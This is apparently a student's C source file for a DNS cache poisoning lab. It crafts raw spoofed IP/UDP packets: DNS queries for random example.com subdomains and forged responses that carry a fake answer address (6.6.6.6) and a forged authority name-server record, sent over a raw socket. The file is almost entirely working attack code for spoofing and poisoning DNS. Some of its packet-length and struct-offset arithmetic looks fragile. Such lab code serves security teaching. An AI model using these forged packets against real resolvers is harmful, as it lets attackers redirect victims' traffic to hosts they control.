// ----udp.c------
// This sample program must be run by root lol! 
// 
// The program is to spoofing tons of different queries to the victim.
// Use wireshark to study the packets. However, it is not enough for 
// the lab, please finish the response packet and complete the task.
//
// Compile command:
// gcc -lpcap udp.c -o udp
//
// 
#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <libnet.h>
#include <arpa/inet.h>
#include <time.h>

#define PCKT_LEN 8192
#define FLAG_R 0x8400
#define FLAG_Q 0x0100
     


// Can create separate header file (.h) for all headers' structure

// The IP header's structure

struct ipheader {
    unsigned char      iph_ihl:4, iph_ver:4;
    unsigned char      iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    //    unsigned char      iph_flag;
    unsigned short int iph_offset;
    unsigned char      iph_ttl;
    unsigned char      iph_protocol;
    unsigned short int iph_chksum;
    unsigned int       iph_sourceip;
    unsigned int       iph_destip;
};

// UDP header's structure
struct udpheader {
    unsigned short int udph_srcport;
    unsigned short int udph_destport;
    unsigned short int udph_len;
    unsigned short int udph_chksum;
};

struct dnsheader {
	unsigned short int query_id;
	unsigned short int flags;
	unsigned short int QDCOUNT;
	unsigned short int ANCOUNT;
	unsigned short int NSCOUNT;
	unsigned short int ARCOUNT;
};

// This structure just for convinience in the DNS packet, because such 4 byte data often appears. 
struct dataEnd {
	unsigned short int  type;
	unsigned short int  class;
};
// total udp header length: 8 bytes (=64 bits)
#pragma pack ( 1 )
struct RES_RECORD {
    unsigned char *name;
    unsigned short type;
    unsigned short class;
    uint32_t ttl;
    unsigned short rdlength;
    unsigned char *rdata;
};

unsigned int checksum(uint16_t *usBuff, int isize)
{
	unsigned int cksum=0;
	for(;isize>1;isize-=2){
	    cksum+=*usBuff++;
    }
	if(isize==1) {
        cksum+=*(uint16_t *)usBuff;
    }


	return (cksum);
}

// calculate udp checksum
uint16_t check_udp_sum(uint8_t *buffer, int len)
{
    unsigned long sum=0;
	struct ipheader *tempI=(struct ipheader *)(buffer);
	struct udpheader *tempH=(struct udpheader *)(buffer+sizeof(struct ipheader));
	struct dnsheader *tempD=(struct dnsheader *)(buffer+sizeof(struct ipheader)+sizeof(struct udpheader));
	tempH->udph_chksum=0;
	sum=checksum( (uint16_t *)   &(tempI->iph_sourceip) ,8 );
	sum+=checksum((uint16_t *) tempH,len);

	sum+=ntohs(IPPROTO_UDP+len);
	

	sum=(sum>>16)+(sum & 0x0000ffff);
	sum+=(sum>>16);

	return (uint16_t)(~sum);
	
}

unsigned short csum(unsigned short *buf, int nwords) 
{
    unsigned long sum;

    for(sum=0; nwords>0; nwords--)

            sum += *buf++;

    sum = (sum >> 16) + (sum &0xffff);

    sum += (sum >> 16);

    return (unsigned short)(~sum);

}


void dns_q(char *src_ip, char *dst_ip, char *query, char *dst_buffer, unsigned int *dst_packetquery_len) 
{
    char *buffer = dst_buffer;
    // Our own headers' structures

    struct ipheader *ip = (struct ipheader *) buffer;
    struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));
    struct dnsheader *dns=(struct dnsheader*) (buffer +sizeof(struct ipheader)+sizeof(struct udpheader));
    // data is the pointer points to the first byte of the dns payload  
    unsigned char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));



    ////////////////////////////////////////////////////////////////////////
    // dns fields(UDP payload field)
    // relate to the lab, you can change them. begin:
    ////////////////////////////////////////////////////////////////////////

    //The flag you need to set
    
	dns->flags=htons(FLAG_Q);
    //only 1 query, so the count should be one.
	dns->QDCOUNT=htons(1);


    //query string
    strcpy(data,query);
    int query_len= strlen(data)+1;



    //this is for convinience to get the struct type write the 4bytes in a more organized way.
    struct dataEnd * end=(struct dataEnd *)(data+query_len);
    end->type=htons(1);
    end->class=htons(1);

    // Fabricate the IP header or we can use the

    // standard header structures but assign our own values.
    unsigned short int packetquery_len =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+query_len+sizeof(struct dataEnd)); // query_len + dataEnd_size == UDP_payload_size

    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0; // Low delay
    ip->iph_len=htons(packetquery_len);
    ip->iph_ident = htons(rand()); // we give a random number for the identification#
    ip->iph_ttl = 110; // hops
    ip->iph_protocol = 17; // UDP
    // Source IP address, can use spoofed address here!!!
    ip->iph_sourceip = inet_addr(src_ip);
    // The destination IP address
    ip->iph_destip = inet_addr(dst_ip);
    udp->udph_srcport = htons(40000+rand()%10000);  // source port number, I make them random... remember the lower number may be reserved

    // Destination port number

    udp->udph_destport = htons(53);
    udp->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+query_len+sizeof(struct dataEnd)); // udp_header_size + udp_payload_size

    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
 

    udp->udph_chksum=check_udp_sum(buffer, packetquery_len-sizeof(struct ipheader));
    udp->udph_chksum=check_udp_sum(buffer, packetquery_len-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet
    *dst_packetquery_len = packetquery_len;
}

unsigned int write_question(void *buffer, char *query) {
    //Query section
    strcpy(buffer, query);
    int query_len = strlen(query)+1;

    buffer = buffer + query_len; //Write next bytes

    struct dataEnd * end=(struct dataEnd *)(buffer);
    end->type=htons(1);
    end->class=htons(1);

    unsigned int bytes_written = query_len + sizeof( struct dataEnd );
    return bytes_written;
}

void dns_a (
    char *src_ip, 
    char *dst_ip, 
    char *query, 
    char *ip_answer, 
    char *dst_buffer, 
    unsigned int *dst_packetquery_len) 
{

    char *buffer = dst_buffer;
    // Our own headers' structures
    struct ipheader *ip = (struct ipheader *) buffer;
    struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));
    struct dnsheader *dns = (struct dnsheader*) (buffer +sizeof(struct ipheader)+sizeof(struct udpheader));

    // data is the pointer points to the first byte of the dns payload  
    unsigned char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));

    //standart response
	dns->flags=htons(FLAG_R);
    //only 1 query, so the count should be one.
	dns->QDCOUNT=htons(1);
    //only 1 answer
    dns->ANCOUNT=htons(1);

    //Points to the last byte written
    void *last_byte = data;

    int query_len = strlen(query)+1;

    
    //Query section
    last_byte += write_question(last_byte, query);

    
    

    //Answer section
    {
        //Name
        strcpy(last_byte, query);
        last_byte += query_len;

        struct RES_RECORD *answer=(struct RES_RECORD*)(last_byte - sizeof(void*)); //minus sizeof(char *name)
        answer->type = htons(1);
        answer->class = htons(1);
        answer->ttl = htonl(82400);
        answer->rdlength = htons(4);
        answer->rdata = inet_addr(ip_answer);

        answer = NULL; //do not use answer struct anymore!
    }

    //printf("sizeof(struct RES_RECORD) = %d\n", sizeof(struct RES_RECORD)); //26
    //printf("ushort = %d\nuchar* = %d\nuint32_t = %d\nchar* = %d\nvoid* = %d\n", sizeof(unsigned short), sizeof(unsigned char*), sizeof(uint32_t), sizeof(char*), sizeof(void*));

    
    // unsigned char *name;          8     (10)
    // unsigned short type;          2     
    // unsigned short class;         2
    // uint32_t ttl;                 4
    // unsigned short rdlength;      2
    // unsigned char *rdata;         8     (4)
    //                          sum: 26    (24)
    //wireshark: 26

    //last_byte += sizeof(struct RES_RECORD);//                    26
    //last_byte -= (sizeof(void*) - 4); //*rdata fix


    // last_byte += query_len; //name
    last_byte += sizeof(unsigned short) * 3; //type + class + rdlength
    last_byte += sizeof(uint32_t); //ttl
    last_byte += 4; //size of rdata (4 octets)

    


    //printf("name offset:      %d name size:      %d\n", (int)&answer->name - (int)answer, strlen(answer->name)+1);
    // printf("type offset:      %d type size:      %d\n", (int)&answer->type - (int)answer, sizeof(answer->type));
    // printf("class offset:     %d class size:     %d\n", (int)&answer->class - (int)answer, sizeof(answer->class));
    // printf("ttl offset:       %d ttl size:       %d\n", (int)&answer->ttl - (int)answer, sizeof(answer->ttl));
    // printf("rdquery_len offset:  %d rdquery_len size:  %d\n", (int)&answer->rdquery_len - (int)answer, sizeof(answer->rdquery_len));
    // printf("rdata offset:     %d rdata size:     %d\n", (int)&answer->rdata - (int)answer, sizeof(answer->rdata));
    // int class_offset = (int)&answer->class - (int)answer;
    // int ttl_offset = (int)&answer->ttl - (int)answer;
    //printf("ttl offset - class offset = %d\n", ttl_offset - class_offset);

    
    
    //Authorative answer
    {
        dns->NSCOUNT=htons(1);

        //Name
        strcpy(last_byte, "\2ns\7example\3com");
        int ns_len = strlen("\2ns\7example\3com") + 1;
        last_byte += ns_len;

        struct RES_RECORD *authorative=(struct RES_RECORD*)(last_byte - sizeof(void*)); //minus sizeof(char *name)
        //Type
        authorative->type = htons(2); //ns
        //Class
        authorative->class = htons(1); //inet
        //TTL
        authorative->ttl = htonl(82400);
        last_byte += sizeof(unsigned short) + sizeof(unsigned short) + sizeof(uint32_t);; //type, class, tll
        //Name
        char *a = "\1a\12iana-servers\3net";
        char *b = "\7example\3com";
        char *c = query;
        strcpy(last_byte, query);
        int name_server_len = strlen(query) + 1;

        last_byte += name_server_len;

        //Rd (name server) length
        authorative->rdlength = htons(name_server_len);
        
        authorative = NULL; //do not use anymore!
    }
    

    printf("%d\n", (int)last_byte - (int)data);



    dns->query_id=rand(); // transaction ID for the query packet, use random #



    // Fabricate the IP header or we can use the

    // standard header structures but assign our own values.
    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0; // Low delay

    last_byte += 10;
    unsigned short int packetquery_len =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+ (int)last_byte-(int)data );
    udp->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+query_len+sizeof(struct dataEnd)+(int)last_byte-(int)data);

    //printf("Packet query_len = %d\n", packetquery_len);
    ip->iph_len=htons(packetquery_len);
    ip->iph_ident = htons(rand()); // we give a random number for the identification#
    ip->iph_ttl = 110; // hops
    ip->iph_protocol = 17; // UDP
    // Source IP address, can use spoofed address here!!!
    ip->iph_sourceip = inet_addr(src_ip);
    // The destination IP address
    ip->iph_destip = inet_addr(dst_ip);
    udp->udph_srcport = htons(40000+rand()%10000);  // source port number, I make them random... remember the lower number may be reserved
    // Destination port number
    udp->udph_destport = htons(53);
    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp->udph_chksum=check_udp_sum(buffer, packetquery_len-sizeof(struct ipheader));


    udp->udph_chksum=check_udp_sum(buffer, packetquery_len-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet
    *dst_packetquery_len = packetquery_len;
}

int main(int argc, char *argv[])
{
    // socket descriptor
    int sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);

    if(sd<0 ) // if socket fails to be created 
        printf("socket error\n");

    // Inform the kernel do not fill up the packet structure. we will build our own...
    int one = 1;
    const int *val = &one;
    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 ) {
        printf("error\n");	
        exit(-1);
    }

    //dns_q(argc, argv);
    char *src_ip = "127.0.0.1";
    char *dst_ip = "127.0.0.1";
    struct sockaddr_in sin, din;

    // The source is redundant, may be used later if needed
    // The address family
    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;
    // Port numbers
    sin.sin_port = htons(33333);
    din.sin_port = htons(53);
    // IP addresses
    sin.sin_addr.s_addr = inet_addr(src_ip); // this is the second argument we input into the program
    din.sin_addr.s_addr = inet_addr(dst_ip); // this is the first argument we input into the program

    
    // buffer to hold the packet
    char buffer[PCKT_LEN];
    // set the buffer to 0 for all bytes
    memset(buffer, 0, PCKT_LEN);

    unsigned int packetquery_len = 0;

    char query[18];
    strcpy(query, "\4abcd\7example\3com");

    srand(time(0)); //use time as seed

    for(int i = 0; i < 1; i++) {

        //randomize query (first 4 chars of first label)
        for(int i = 1; i < 5; i++) {
            query[i] = '1' + rand() % ('9'-'1');
        }

        dns_a(src_ip, dst_ip, query, "6.6.6.6", buffer, &packetquery_len);
        //dns_q(src_ip, dst_ip, query, buffer, &packetquery_len);

        printf("Query: %s\n", query);
        //printf("Packet query_len: %d\n", packetquery_len);
        
        if(sendto(sd, buffer, packetquery_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            printf("packet send error %d which means %s\n",errno,strerror(errno));
        }
    }


    close(sd);
    return 0;
}

